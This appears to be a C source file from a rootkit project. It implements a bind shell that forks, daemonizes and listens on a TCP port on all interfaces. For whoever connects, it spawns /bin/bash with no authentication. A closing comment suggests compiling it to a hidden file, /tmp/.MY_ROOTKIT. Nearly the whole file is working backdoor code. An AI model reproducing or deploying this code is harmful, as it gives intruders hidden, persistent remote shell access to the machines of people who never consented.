#include "rkconstant.h"
#include"bind_shell.h"

int if_running(){
    //check if bind shell is already running
    int clint_fd;
    clint_fd = socket(AF_INET,SOCK_STREAM,0);
    struct sockaddr_in server_addr;
    server_addr.sin_family =AF_INET;
    server_addr.sin_port =htons(PORT);
    server_addr.sin_addr.s_addr=INADDR_ANY;

    int val = connect(clint_fd,(struct sockaddr *)&server_addr,sizeof(server_addr));
    if(val == 0){
        close(clint_fd);
        return 1;
    }
    else {

        return 0;
    }
}

//create socket object
void create(){
    if(if_running() == 1){
        #ifdef DEBUG
            fprintf(stderr,"Bind shell already running \n");
        #endif
        return;
    }

    int sockfd,newsock_fd,status;

    //handle multiple processes with fork
    pid_t pid =fork();
    if(pid < 0){
        fprintf(stderr,"ERROR in forking process ");
        exit(EXIT_FAILURE);
    }
    if(pid == 0){
        //background process with daemon
        daemon(0,1);
        struct sockaddr_in socket_config;
        socket_config.sin_family =AF_INET;
        socket_config.sin_port = htons(PORT);
        socket_config.sin_addr.s_addr=INADDR_ANY;

        sockfd=socket(AF_INET,SOCK_STREAM,0);
        //check if socket is created
        if(sockfd < 0){
            fprintf(stderr,"ERROR in creating socket object ");
            exit(EXIT_FAILURE);
        }
        status = bind(sockfd,(struct sockaddr *)&socket_config,sizeof(socket_config));
        if(status < 0){
            fprintf(stderr,"ERROR in binding socket ");
            exit(EXIT_FAILURE);
        }
        status = listen(sockfd,5);
        if(status < 0){
            fprintf(stderr,"ERROR in listening to socket ");
            exit(EXIT_FAILURE);
        }
        newsock_fd=accept(sockfd,NULL,NULL);
        if(newsock_fd < 0){
            fprintf(stderr,"ERROR in accepting connections");
            exit(EXIT_FAILURE);
        }

        dup2(newsock_fd,STDIN_FILENO);
        dup2(newsock_fd,STDOUT_FILENO);
        dup2(newsock_fd,STDERR_FILENO);

        //execute bash shell on connection
        char *const argv[]= {"/bin/bash",NULL};
        execve("/bin/bash",argv,NULL);
        exit(EXIT_SUCCESS);

}
    return;
}

/*
since there is no hooking being done here i can try compiling this to be a separate 
executable file and this is what will run in the background  only way i can think of to make it 
intresting at least well until we enter the debugging phase

gcc bind_shell.c -o /tmp/.MY_ROOTKIT 
comiple to this path
*/
